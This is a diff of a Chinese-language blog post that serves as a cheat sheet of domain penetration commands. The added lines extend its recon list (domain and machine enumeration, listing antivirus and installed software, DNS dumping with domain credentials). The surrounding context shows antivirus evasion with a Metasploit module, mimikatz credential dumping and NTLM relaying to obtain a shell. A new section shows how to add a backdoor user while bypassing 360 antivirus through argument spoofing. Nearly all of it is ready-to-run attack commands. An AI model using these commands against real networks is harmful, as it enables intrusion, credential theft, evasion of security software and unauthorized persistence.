@@ -84,7 +84,7 @@
             <h1>域渗透常用命令</h1>
             <span class="meta">
             	Posted on
-              2020-07-15，6 min read
+              2020-07-15，7 min read
             </span>
           </div>
         </div>
@@ -98,7 +98,11 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <h1 id="信息搜集">信息搜集</h1>
-<pre><code>setspn -T jumbolab.com -Q */*
+<pre><code>net view /domain:XXX
+查看XXX域中的机器列表
+net view /domain
+查看内网中有多少个域
+setspn -T jumbolab.com -Q */*
 快速寻找内网中注册的服务
 net user /domain
 查看域用户
@@ -124,6 +128,16 @@ dsquery ou
 列出该域内组织单位 
 dsquery server &amp;&amp; net time /domain
 列出该域内域控制器 
+wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+列出杀软
+wmic product get name,version
+查看安装的软件
+quser
+查看在线用户
+net config workstation
+查看当前登陆域
+dnsdump.exe -u 域名\与用户 -p 域密码 域控机器名
+用普通域用户获取域内所有DNS解析
 </code></pre>
 <h1 id="免杀">免杀</h1>
 <pre><code>use evasion/windows/windows_defender_exe
@@ -270,6 +284,13 @@ sekurlsa::logonPasswords full
 python MultiRelay.py -t 192.168.0.4 -u ALL
 //要获取shell的目标IP
 然后客户机去访问192.168.0.4，中继到shell
+</code></pre>
+<p>绕过360添加用户</p>
+<pre><code>Argue net1 xxxxxxxxxxxxxxxxxxxxxx
+execute net1 user 123 123 /add
+
+https://github.com/lengjibo/RedTeamTools/tree/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7
+帐号：hacker 密码：P@ssw0rd
 </code></pre>
 
           
